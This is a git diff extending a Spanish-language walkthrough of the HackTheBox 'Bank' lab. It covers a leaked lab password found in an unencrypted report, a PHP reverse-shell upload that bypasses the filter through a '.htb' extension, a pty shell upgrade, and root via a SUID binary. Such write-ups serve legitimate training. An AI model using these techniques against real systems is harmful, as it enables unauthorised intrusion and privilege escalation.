@@ -42,7 +42,7 @@ bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
 
 #### HTTP
 
-Tenemos varias URL que añadir a /etc/hosts gracias al DNS
+Tenemos varias URL que añadir a /etc/hosts gracias al DNS, tambien es buena idea ir abriendo burpsuite y añadir ambas al target scope
 ```
 chris.bank.htb
 bank.htb
@@ -53,5 +53,96 @@ El dominio bank.htb nos redirige a bank.htb/login.php vamos a enumerar directori
 /inc (Status: 301)
 /server-status (Status: 403)
 /uploads (Status: 301)
+/balance-transfer (Status: 301)  
 ```
-Dentro de uploads no podemos mirar pero dentro de inc si y tenemos varios archivos .php
+Dentro de uploads no podemos mirar pero dentro de inc si y tenemos varios archivos .php pero nada que podamos ver, vayamos a /balance-transfer y veremos muchos reportes de un servicio de encriptacion con el siguiente formato:
+```
+++OK ENCRYPT SUCCESS
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
+Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
+Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
+CreditCards: 5
+Transactions: 93
+Balance: 905948 .
+===UserAccount===
+```
+Todos con una peso aproximado de 580 excepto uno que pesa la mitad que el resto, accedamos a el
+
+```
+--ERR ENCRYPT FAILED
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 .
+===UserAccount===
+```
+Parece que alguien no verifico que la encriptacion funcionara , accedamos usando estas creds, una vez dentro tenenmos acceso a un menu para ver las transas y a un formulario para mandar tickets al soporte, pero en el fuente de la página del soporte hay algo sospechoso
+
+### Exploit
+```html
+<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
+```
+Con esto podremos subir una revshell php cambiando la extensión por la de .htb y evitar cualquier filtro, solo es cuestion de adjuntarla al ticket y mirar nuestro ticket y ya tenemos shell
+
+```
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ wc -c /home/chris/user.txt
+33 /home/chris/user.txt
+```
+
+### Privesc
+
+Consigamos una shell funcional antes que nada
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+Tras esto busquemos programas con SUID
+```
+www-data@bank:/$ find / -type f -user root -perm -4000 2> /dev/null
+/var/htb/bin/emergency
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/mtr
+/usr/sbin/pppd
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/umount
+```
+El primer resultado es cuanto menos peculiar, ejecutemoslo y veamos que ocurre
+
+```
+www-data@bank:/$ /var/htb/bin/emergency
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+```
+Tenemos shell como root, ya solo queda coger la flag 
+```
+# wc -c /root/root.txt
+33 /root/root.txt
+```
